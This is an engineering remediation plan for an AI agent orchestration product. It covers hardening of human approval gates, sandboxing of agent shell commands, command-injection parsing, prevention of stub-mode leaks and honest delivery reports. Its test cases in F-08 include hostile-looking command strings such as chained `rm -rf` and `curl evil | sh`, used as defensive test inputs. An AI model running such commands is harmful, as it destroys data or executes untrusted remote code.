# M13 Remediation Plan — Spec 全量审查修复计划

Status: in progress（Phase 1 / PR-A 进行中）
Branch: `feat/m13-remediation`（从 `feat/m10-deployment-delivery` 切出）
Source: 2026-06-10 全量代码审查（M0–M12 对照 `spec.md` v0.3.3，74 项发现：33 严重 / 32 较高 / 9 次要）
Estimated effort: 28–38 days（一名工程师；P0 约 2 周，P1 约 2 周（含硬中断 Pause），P2 约 1 周）
Decisions: D1–D5 已于 2026-06-10 全部确认（见 §10）

## 1. 目标与原则

审查结论：骨架正确，但产品三个核心承诺（人审必达、治理无旁路、交付诚实）在主路径上有断点。本计划按根因分 7 个阶段修复，每项遵循仓库 TDD 规范：**先写红测试复现缺陷，再实现修复**。

修复优先级：

| 优先级 | 阶段 | 主题 | 判断标准 |
| --- | --- | --- | --- |
| **P0** | Phase 1–3 | Gate 闭环 / 治理旁路 / 假绿灯 | 破坏产品核心承诺，必须先修 |
| **P1** | Phase 4–5 | 工作流死端 / 事件流与前端 | 用户必然撞到的死端与失真 |
| **P2** | Phase 6–7 | M12 补完 / 架构清理 | 完整性与质量债 |

---

## 2. Phase 1 — Gate 人审闭环可靠性（P0，~3 天）

### F-01 resolveGate 失败语义修复

- **问题**：gate 先标记 resolved 再调 `onGateResolved`，resume 抛错仍返回 200（`apps/api/src/gates/service.ts:125-176`）。
- **修复**：resume 失败时将 gate 状态回滚为 `open`（或新增 `resume_failed` 状态 + 可重试），HTTP 返回 500 + 结构化错误；`human_gate.resolved` 事件仅在 resume 成功后 emit。
- **红测试**：`gates-service.test.ts` — onGateResolved 抛错 → gate 仍 open、响应非 200、无 resolved 事件。

### F-02 移除 isBenignResumeError 静默吞错

- **问题**：phase 不匹配等被当"良性"返回成功（`apps/api/src/gates/resume.ts:72-80`）。
- **修复**：stale/错位 gate 返回 409 Conflict 与明确 reason；只有真正幂等场景（同一 decision 重复提交）静默成功。
- **红测试**：resolve 一个 session 已前进的 gate → 409。

### F-03 custom:<text> 决策全链路处理

- **问题**：`normalizeDecision` 产出 `custom:<text>`，但 requirement/deployment/final-acceptance/change-review 的 resume 分支只匹配字面量 `custom` 或直接抛错。
- **修复**：shared 增加 `parseDecision(decision): { kind, customText? }` 工具；所有 resume handler 改用它。custom 语义：等价 approve + 把 customText 写入对应 session 的 notes/risks 并 emit 事件。
- **红测试**：每个支持 custom 的 gate 类型 resolve `custom:xxx` → 工作流前进且 customText 留痕。

### F-04 waitForGate 超时修复

- **问题**：默认 10s 超时，真人审批必超时（`gates/service.ts:184-201`），shell 与 integrations 均中招。
- **修复**：人审场景默认 `timeoutMs: 0`（无限等待）；超时仅用于显式传入的自动化场景。shell `runCommand` 与 integrations `callTool` 传 0。
- **红测试**：gate 创建后 15s 再 resolve，命令/集成调用正常完成。

### F-05 skip_risk_and_continue 执行层统一禁令

- **问题**：HTTP 层禁了高危 skip，但 `shell.ts:83-85`、`authorize.ts:30-32`、`apps/api/src/integrations/service.ts:61-68` 执行层无条件当 approve。
- **修复**：shared 暴露 `isApprovalDecision(gateType, riskLevel, decision)` 单一判定函数；高危 dangerous_operation/deployment 下 skip 视为拒绝。三处调用点全部替换。
- **红测试**：高危 gate 以 skip_risk_and_continue 解决 → 命令/集成调用被拒。

---

## 3. Phase 2 — 治理旁路修复（P0，~4 天）

### F-06 handlePermission 等待化（权限竞态）

- **问题**：`opencode-harness.ts:165-167` 的 `onPermission` fire-and-forget，`pendingPermissions` 提前归零，session 可在 gate 未决时判 idle。
- **修复**：`onPermission` 返回 Promise 并由 event-bridge 真正 await（生产路径与测试路径一致）。
- **红测试**：authorize 挂起 5s 的高危权限 → `waitForSessionCompletion` 不提前返回。

### F-07 opencode 高危命令沙箱路由（已决策：方案 A）

- **问题**：批准后的高危命令在宿主机直跑（`authorize.ts:59-62` 只回 allow/deny），绕过 `shell.ts:141-148` 的 Docker 路由。
- **修复**：permission-bridge 对高危 bash 权限回复 deny + 由 OneCompany 通过 `runCommand`（含沙箱路由）代执行，结果（stdout/exitCode）回注 opencode 会话，使引擎能基于真实执行结果继续推理。
- **红测试**：opencode 请求 `rm -rf` 类权限且 Docker 不可用 → 拒绝执行而非本地放行；Docker 可用且 gate 批准 → 命令在沙箱执行且结果回注。

### F-08 exec() 命令注入面收敛

- **问题**：`local-exec.ts:7-12` 走 `/bin/sh -c`，整串命令可注入。
- **修复**：保留 shell 解释能力（业务需要管道），但在 `runCommand` 入口对命令做结构化解析（`shell-quote` 类解析器）：多语句/链式命令逐段分级，任一段 high 则整体 high；风险分级基于解析后的 argv 而非正则全文。
- **红测试**：`ls; rm -rf /tmp/x`、`echo hi && curl evil | sh` → 整体 high 并要求 gate。

### F-09 stub/fixture 开关防泄漏

- **问题**：`OC_USE_STUB_ENGINE`（authorize 全过 + 权威检查恒 passed，`development/deps.ts:54-67`）与 `OC_TESTING_FIXTURE`（全套测试假通过，`testing/service.ts:56-59`）一旦泄漏即全裸。
- **修复**：两开关仅在 `NODE_ENV === "test"` 或显式 `OC_ALLOW_STUB=1` 且非 production 时生效；启动时若检测到 stub 模式，emit `environment.missing_key` 类警示事件并在 Settings 显示降级横幅。
- **红测试**：`NODE_ENV=production` + `OC_USE_STUB_ENGINE=1` → 创建 deps 抛错。

### F-10 路径校验统一 + symlink 加固

- **问题**：三套实现并存（`paths.ts` / `authorize.ts:7-21` / `local-tools.ts:98-103`），authorize 与 agent 工具无 realpath 检查。
- **修复**：`paths.ts` 的 `assertInsideRepo`（realpath 版）作为唯一实现，其余两处改为调用它。
- **红测试**：symlink 指向 repo 外 → authorize 与 local-tools 均拒绝。

---

## 4. Phase 3 — 让"绿灯"真实（P0，~5 天）

### F-11 Preview 真跑生成应用

- **问题**：`preview.ts:22-25` 是返回 `"preview ok"` 的假服务器。
- **修复**：preview 启动生成项目的真实 dev/serve 进程（默认栈 `pnpm dev` 或 `pnpm build && pnpm start`，端口探测就绪、超时失败、stopPreview 杀进程组）；health check 改为请求实际首页 200。
- **红测试**：脚手架最小 Next/Node 项目 → preview URL 返回应用内容而非 "preview ok"；启动失败 → preview 状态 failed 而非假可达。

### F-12 RunCommandInput 支持 env + Playwright BASE_URL 生效

- **问题**：`playwright.ts:72-83` 构造的 env 从未传入（`shell.ts:34-38` 无 env 字段）。
- **修复**：`RunCommandInput` 增加 `env?: Record<string,string>`，`runLocal`/`runSandbox` 透传；Playwright/build/typecheck runner 改传 env。
- **红测试**：runner 注入 `BASE_URL` → 子进程实际读到。

### F-13 切片测试结果入库 + slice: 前缀

- **问题**：`engine-legacy.ts:89-109` 用裸 slice id 且不写 `test_results` 表，Tests 页 slice 桶恒空。
- **修复**：统一 `slice:${slice.id}` 命名；调用 `persistRunnerResult` 入库；graph 路径同步。
- **红测试**：跑一个切片 → `loadTestResults(db, projectId, "slice")` 非空。

### F-14 runner 读取分块输出

- **问题**：build/typecheck/playwright 只读 inline（`runners/build.ts:32-33` 等），>8KB 输出解析空串。
- **修复**：三个 runner 统一改用 `readOutputText`（vitest 已正确）；Playwright 同时检查 `exitCode`。
- **红测试**：构造 >8KB 输出的命令 → 解析结果正确。

### F-15 交付物与报告诚实化

- **问题**：Dockerfile `RUN pnpm build || true`（`docker-artifacts.ts:16-24`）；报告可在任意状态生成、reject 后复用旧报告（`delivery/service.ts:71-73`、`final-acceptance.ts:31-41`）；redaction incidents 不进报告；`[MOCK]` 标记未实现（`report-generator.ts:174`）。
- **修复**：
  1. 去掉 `|| true`；
  2. `generate` 仅允许 `Awaiting Acceptance`/`Delivered`；`reject_and_redo` 后清 `reportGenerated` 强制重建；
  3. `redact()` incidents 经 log-pipeline 持久化（新 events 或 artifacts 行），`collectProjectRisks` 汇入报告；
  4. 报告生成时扫描 repo 中 `[MOCK]` 标记与缺失 env key，列入 risks/follow-up。
- **红测试**：每条独立红测试（状态守卫 409 / reject 后报告内容变化 / 含密钥输出产生 incident 风险行 / 含 [MOCK] 源文件出现在报告）。

### F-16 emit() 统一脱敏 + 非 shell 工具输出分块

- **问题**：`events/log.ts:22-64` 不脱敏，`agent.error`/`run.failed` 消息可带密钥；`agent-core/tools.ts:25-28` 硬截 500 字符。
- **修复**：`emit` 内对 payload 字符串字段统一 `redact`（incidents 记录）；`callTool` 输出走 `persistOutput` 分块归档，事件带 summary + artifact ref。
- **红测试**：emit 带 `sk-...` 的 error payload → 落库为 `[REDACTED]`；10KB 工具输出 → artifact 行存在。

---

## 5. Phase 4 — 工作流死端修复（P1，~5 天）

### F-17 失败切片 retry 真正重跑

- **问题**：失败 slice 停 `in_progress`，`hasPendingSlices` 只数 pending → retry 直接 finalize（`graph.ts:267-271`、`slice-policy.ts:10-12`）；默认单 slice 必中。
- **修复**：gate `retry` 决策时将当前 slice 重置为 `pending` 并清 attempts 计数（延长预算语义）；循环谓词改为"存在 pending 或可重试 in_progress"。同步设置 `failed` 状态枚举的真实使用（预算耗尽未决时）。
- **红测试**：单 slice 项目失败 → retry → slice 实际重跑。

### F-18 变更评审 reject 后续驱动

- **问题**：reject 后无 gate、slice 留 in_progress、无人驱动（`change-review.ts:332-353`）。
- **修复**：reject 来自 slice_failure 升级的场景重开 `slice_failure` gate；来自主动变更请求的场景将 slice 重置 pending 并继续切片循环。
- **红测试**：两条路径分别断言有后续 gate 或 slice 重跑。

### F-19 需求 reject_and_redo / revise_then_approve 闭环

- **问题**：reject 后 UI 无问题可答、不重评分（`requirement/graph.ts:464-475` + `snapshot.ts:50-60`）；两决策行为相同。
- **修复**：
  - `reject_and_redo`：重跑 analyst+scorer，规划新一轮问题（新 round，空 answers），UI 自然恢复问题卡片；
  - `revise_then_approve`：携带 customText 时将其作为补充输入重跑 analyst → 重新生成 PRD → 重开 confirm gate（不回问答循环）。
- **红测试**：reject 后 snapshot `pendingQuestions` 非空；revise 后出现新 PRD 版本 + 新 confirm gate。

### F-20 答案真正参与需求更新

- **问题**：answers 存库但 analyst 从不重跑，stub 评分忽略答案（`graph.ts:315-339`、`scripted-runner.ts:11-24`）。
- **修复**：waitAnswers 后路由 analyst（合并答案进结构化状态）再 scorer；stub scorer 改为按已答轮数+答案非空度增分，使 fixture 行为与真实语义一致。
- **红测试**：提交答案后结构化字段变化、分数与答案相关。

### F-21 需求会话幂等 + 答案校验 + profile 透传

- **问题**：重复 start 插重复行（`state.ts:56-74`）；答案数不校验（`graph.ts:318-333`）；API 路径 stub profile 被覆盖（`requirement/deps.ts:47-72` + `runner-factory.ts:30-36`）。
- **修复**：`requirement_sessions(project_id)` 唯一索引 + start 改 upsert/幂等返回；答案数 != 问题数 → 400；runner-factory 仅在 task 无 profile 时用默认值。
- **红测试**：三条独立红测试。

### F-22 状态机缺边与路由修复

- **问题**：Testing 允许变更请求但 `Testing→Change Review` 非法（`change-requests/service.ts:11` vs `project-status.ts:28`）；架构级变更恒回 Developing（`change-review.ts:300`）；部署 reject 卡死 Deploying（`deployment/engine.ts:75-85`）；approve PRD 不转 Tech Plan Review（`graph.ts:455-462`）。
- **修复**：
  1. 转换表加 `Testing → Change Review` 与 `Change Review → Testing`；
  2. `update_plan` 且 impact=architecture → `Tech Plan Review`；
  3. 部署 reject → `setStatus(Testing, "deployment_rejected")`（转换表加 `Deploying → Testing`）；
  4. approve PRD → 直接 `setStatus("Tech Plan Review")`（与 spec §3.1 对齐；"开始开发"按钮变为触发 tech plan gate 的入口）。**已决策：采用自动转换。**
- **红测试**：每条边一个转换测试 + 工作流级断言。

### F-23 Test Designer 与 skip_slice 语义

- **问题**：testDesigner 输出被丢弃（`planner.ts:14-36`）；skip_slice 不更新 PRD（`change-review.ts:148-155`）。
- **修复**：testDesigner 输出（每 slice 测试要点）合入 taskQueue 的 slice spec；skip_slice 同步追加 PRD 修订版本（标注被豁免的功能与原因），acceptance 与 PRD 双留痕。
- **红测试**：slice spec 含测试要点；skip 后 `prd_versions` 新行。

---

## 6. Phase 5 — 事件流与前端（P1，~5 天）

### F-24 真实 Pause（已决策：硬中断完整版）

- **问题**：pause 只改标签，引擎照跑（`projects/service.ts:152-154`）。
- **修复**（分三层）：
  1. **节点边界检查**：workflow 引擎在每个 slice 前、每轮提问前、每个 suite 前检查项目状态，Paused 则保存 checkpoint 停止；
  2. **硬中断**：pause API 同步 abort 运行中的 opencode session（SDK `session.abort`）、终止运行中的 shell 命令（kill 进程组）、停止活动的 runner；
  3. **半成品状态管理**：中断时不丢弃工作区——未提交改动以 `git stash`（带 slice id 标签）保存，slice 标记为 `interrupted` 并记录中断点元数据（已完成的工具调用、最后事件 seq）；resume 时恢复 stash，将 slice 置回 `in_progress` 并向 opencode 重建上下文（包含已有改动摘要）继续，失败则回退为丢弃 stash + slice 重置 pending 从头跑。
- **依赖**：harness 需支持 session abort 与上下文重建；`FunctionSliceTask.status` 枚举增加 `interrupted`。
- **预估**：4–5 天（含半成品恢复路径），PR-I 相应扩容。
- **红测试**：slice 进行中 pause → opencode session 终止、stash 存在、slice=interrupted；resume → stash 恢复且 slice 继续；恢复失败路径 → 回退重跑不丢 git 历史。

### F-25 前端 SSE 游标回退修复

- **问题**：轮询 hydrate 重置 `lastSeqRef`，丢 SSE 已应用事件（`use-console-projection.ts:31-37,108-134`）。
- **修复**：`lastSeqRef = max(current, snapshot.lastSeq)`；快照应用采用版本比较（snapshot.lastSeq < current 时仅合并不回退）。
- **红测试**：模拟旧快照晚到 → 投影不丢新事件。

### F-26 信息流时间序 + 缺失事件渲染

- **问题**：四段拼接非时间序（`stream-renderer.tsx:137-170`）；reflect/run.failed/change_request/artifact/deployment 等事件不可见（`build-projection.ts:184-187`）。
- **修复**：投影输出单一按 seq 排序的 item 列表（run group 作为内嵌容器而非平行分区）；补齐缺失事件类型的渲染（reflect 进 P/A/O/R、failed/deployment/change_request 为带色行）。
- **红测试**：构造交错事件序列 → DOM 顺序与 seq 一致；reflect 可见。

### F-27 gate UI 一致性

- **问题**：resolved 后窗口期可重复提交、双入口（GateCard + Composer）；SSE 新 gate options 空；gate 元数据三处复制（`terminal-tab.tsx:47-50`、`lib/gates.ts`）。
- **修复**：resolve 即本地乐观移除 + pending 态禁用两处入口（共享同一 mutation hook）；`human_gate.created` 事件 payload 带 options（后端补充）；gate 选项/标题统一从 `@oc/shared` registry 导出，删除 `gate-presentations.ts` 与 `lib/gates.ts` 重复。
- **红测试**：组件测试覆盖三点。

### F-28 Paused 可视化 + Deploy 按钮语义

- **问题**：Paused 只有 pill；Deploy 按钮实为 startTesting 且其他阶段灰掉无解释（`console-layout.tsx:63-68`）。
- **修复**：Paused 显示全局横幅 + composer/gate 操作禁用（与 F-24 联动）；Deploy 按钮按阶段变文案（Testing→"运行最终测试并部署"，Deploying→"部署中"，其他→tooltip 解释），或仅在可用阶段显示。
- **红测试**：组件测试。

### F-29 SSE eventId 游标 + 前端补全（次要项打包）

- **问题**：仅 afterSeq（`events/routes.ts:10-12`）；需求 summary 卡缺失；swimlane 多列无高亮；Project Hub 缺项；Hub 时间轴 Paused/Failed 映射错。
- **修复**：`listEvents` 支持 `afterEventId`；新增需求 summary 卡组件（score 进度条 + chips）；swimlane 删 user/gate 列、补 active 高亮；Hub 修 Paused/Failed 映射 + Pause/Resume 二选一显示（搜索/过滤/工件卡列入 P2 backlog 不阻塞）。
- **红测试**：各组件测试。

---

## 7. Phase 6 — M12 集成网关补完（P2，~4 天）

### F-30 事件契约修复

- **问题**：`tool_call.started` 在执行后 emit、无 `tool_call.failed`、失败无审计行（`call-tool.ts:112-134,194-200`）。
- **修复**：调用前 emit started；try/catch 中 emit failed + 写 `integration_tool_calls` status=failed；输出走分块。
- **红测试**：失败调用 → failed 事件 + 审计行。

### F-31 mock 诚实化

- **问题**：remote 模式返回伪造成功无标记（`mock-adapters.ts:29-48`），不检查凭据。
- **修复**（已决策：mock 保留演示用，flag 控制）：
  1. 调用前检查 `secretRefs` 对应 env：缺失 → 返回结构化 `missing_credentials` 错误并提示配置或走 offline pack，绝不静默走 mock；
  2. mock adapter 仅在显式 `OC_INTEGRATION_MOCK=1` 下可用，输出全部带 `[MOCK]` 前缀与 `simulated: true`；
  3. UI 对 simulated 结果显示"模拟"徽章；Settings 在 flag 开启时显示降级横幅；
  4. 交付报告将模拟集成调用列入"未真实执行"清单（接 F-15 的报告诚实化）。
- **红测试**：无 token 且无 flag 调 github.open_pr → `missing_credentials`，不返回假 PR URL；flag 开启 → 输出含 `[MOCK]` 且报告留痕。

### F-32 风险分级与 gate 修正

- **问题**：`isHighRiskTool` 第二分支忽略 toolName（`call-tool.ts:42-48`）；部署类工具用 dangerous_operation；gate 无元数据；接受 skip（F-05 已涵盖）。
- **修复**：风险仅由 `highRiskTools` 显式列表 + 工具级 permission 映射决定；deploy 类映射 `deployment` gate；`createGate` 透传 `{ integrationId, toolName, args 摘要 }` 进 payload 供 UI 展示。
- **红测试**：list_repos 不触发 gate；create_preview_deploy 触发 deployment gate 且 payload 含工具信息。

### F-33 连接与 allowlist 真实化

- **问题**：enable 即 connected 不验凭据（`connection.ts:65-67`）；scopes/resourceAllowlist 只存不查。
- **修复**：enable 时检查 secretRefs → 缺失则状态 `not_configured`（或新增 `pending_credentials`）；callTool 校验请求 scope ⊆ 连接 scopes；resource 访问对照 resourceAllowlist。UI 状态与 secret readiness 一致。
- **红测试**：无 token enable → 非 connected；越权 scope 调用被拒。

### F-34 持久化与管线接入

- **问题**：`integration_definitions`/`skill_packs`/`skill_pack_runs` 三表无写入（`registry.ts:6-50`）；网关未接入 agent 工具管线。
- **修复**：seed 时 upsert definitions 表（带版本）；skill-pack-loader 同步 packs 表；offline 调用写 skill_pack_runs；agent-core 工具注册表暴露 `integration_call` 工具（经 callIntegrationTool，受同一 authorize 管线）。
- **红测试**：启动后三表有行；agent 经工具调用集成产生完整事件链。

### F-35 Skill Pack 内容补全

- **问题**：缺 templates 内容/scripts/tests/examples，P2 包未建（`skill-packs/*`）。
- **修复**：5 个 P1 包补齐 spec §10.6 要求的目录与最小可用内容（真实模板文件而非空目录）；7 个 P2 包建骨架（manifest + SKILL.md + 路线图说明）。manifest 声称的文件必须存在（loader 校验）。
- **红测试**：loader 校验 manifest 与文件系统一致。

---

## 8. Phase 7 — 架构清理与质量债（P2，~4 天）

### F-36 删除双引擎（已决策：推迟到 P0/P1 全部验证后执行）

- **问题**：requirement 与 development 各有 graph + legacy 两套（~650 行复制），checkpoint 丢失静默 fallback。
- **修复**：graph 为唯一实现；checkpoint 丢失 → 从 DB session 重建 graph 状态（显式恢复函数）而非跑另一套引擎；删除 `OC_USE_LEGACY_ENGINE` 与 `engine-legacy.ts`。
- **执行门槛（硬性）**：PR-A 至 PR-J 全部合并、`pnpm -w test` 绿、且 real-engine golden path 在 CI 跑通至 Delivered 之后才允许开始本项；在此之前 Phase 4 的行为修复需在 graph 与 legacy 两条路径上同步落地并测试。
- **红测试**：现有全部工作流测试在仅 graph 下绿；checkpoint 删除后 resume 仍正确。

### F-37 杂项缺陷清理（一个 PR 打包）

| 项 | 问题 | 修复 |
| --- | --- | --- |
| a | `setStatus` 非事务（`projects/service.ts:107-127`） | db.transaction 包裹三步 |
| b | git 提交缺 agent/run id（`git.ts:32-34`） | commit body 加 `Agent: / Run:` 行，commits 表加列 |
| c | `npm ci` 网络限制缺失（`risk.ts:74-78`） | registry URL 校验 + 文档化网络限制为已知偏差 |
| d | LOW_COMMANDS 精确匹配（`risk.ts:23-30`） | 改为 argv 前缀匹配（依赖 F-08 的解析器）：`ls`/`rg`/`cat`/`git status` 带参仍 low |
| e | 死代码：`assertPreviewBeforePlaywright` 接入 `runTestingPhase`；删 `gateTypeForbidsSkipRisk`、`SliceIterationResult.retry` | — |
| f | PRD 版本语义（`prd.ts:26-27`） | 独立单调修订号，reject 后递增 |
| g | REST 暴露 A/B/C/D 选项（`graph.ts:66-69`） | RunResult 增加 suggestedAnswers |
| h | preview/opencode server 注册表竞态 | 启动加互斥（pending promise 缓存） |
| i | `revise_then_approve` 与 `reject_and_redo` 同分支（tech plan gate，`development/graph.ts:98-107`） | revise 带 customText 注入 architect 重跑；reject 仅重开 gate |
| j | 模型路由：slice 恒 strong + opencode 本地 auth.json 旁路（`types.ts:108-116`、`opencode-auth.ts:91-98`） | tier 来自 agent definition；本地 auth 仅在显式 `OC_ALLOW_LOCAL_OPENCODE_AUTH=1` 时启用 |
| k | event bridge 吞 SSE 错误（`event-bridge.ts:76-78`） | 非正常断开 emit `run.failed` 降级事件 |
| l | gate payload 旧数组格式 hack（`storage.ts:15-28`） | 数据迁移后删除兼容分支 |

---

## 9. PR 切片建议

| PR | 内容 | 预估 |
| --- | --- | --- |
| **PR-A** | Phase 1 全部（F-01–F-05，gate 闭环） | 3 天 |
| **PR-B** | F-06/F-09/F-10（权限竞态 + stub 防泄漏 + 路径统一） | 2 天 |
| **PR-C** | F-07/F-08（opencode 沙箱方案 + 命令解析分级）| 3 天 |
| **PR-D** | F-11/F-12（真 preview + env 透传） | 3 天 |
| **PR-E** | F-13–F-16（测试结果/分块/报告诚实/emit 脱敏） | 3 天 |
| **PR-F** | F-17/F-18（切片与变更评审死端） | 2 天 |
| **PR-G** | F-19–F-21（需求闭环） | 3 天 |
| **PR-H** | F-22/F-23（状态机边 + planner 语义） | 2 天 |
| **PR-I** | F-24（真实 Pause：硬中断 + 半成品恢复，跨层） | 4–5 天 |
| **PR-J** | F-25–F-29（前端事件流与 gate UI） | 4 天 |
| **PR-K** | F-30–F-35（M12 补完） | 4 天 |
| **PR-L** | F-36（删双引擎；门槛见 F-36） | 2 天 |
| **PR-M** | F-37（杂项打包） | 2 天 |

依赖关系：PR-A 先行（多数后续依赖 gate 语义）；PR-C 依赖 PR-B 的解析器；PR-I 依赖 PR-A 与 PR-C（abort 复用 harness 改造）；**PR-L 必须在 PR-A–PR-J 全部合并并通过 golden path 验证后执行**。

---

## 10. 决策点（已全部确认，2026-06-10）

| # | 决策 | 结论 | 落点 |
| --- | --- | --- | --- |
| D1 | opencode 高危命令沙箱 | **A：代执行回注沙箱** | F-07 |
| D2 | approve PRD 状态转换 | **自动转 Tech Plan Review**（"开始开发"变为 tech plan gate 入口） | F-22.4 |
| D3 | Pause 中断粒度 | **硬中断完整版**：abort session + stash 半成品 + interrupted 状态 + resume 恢复上下文 | F-24 |
| D4 | 双引擎删除时机 | **推迟**：PR-A–PR-J 合并且 golden path 验证后执行 | F-36 / PR-L |
| D5 | M12 mock 保留策略 | **显式 flag 保留演示用**：`OC_INTEGRATION_MOCK=1` + 全量 `[MOCK]` 标注 + 报告留痕 | F-31 |

---

## 11. Definition of Done

- [ ] 74 项发现逐项关闭或在本文档标注"接受偏差"及理由
- [ ] 每项修复有先红后绿测试；`pnpm -w test` + `typecheck` + `build` 绿
- [ ] 高危路径专项验证：gate 拒绝/超时/自定义决策、stub 泄漏、命令注入样例、假 preview 检测
- [ ] golden path（real engine）在 CI 跑通至 Delivered，且无 fixture/stub 参与
- [ ] `spec.md` 偏差项（如 D1 选 B）以"Known Deviations"章节显式记录
- [ ] README 里程碑表新增 M13 → ✅
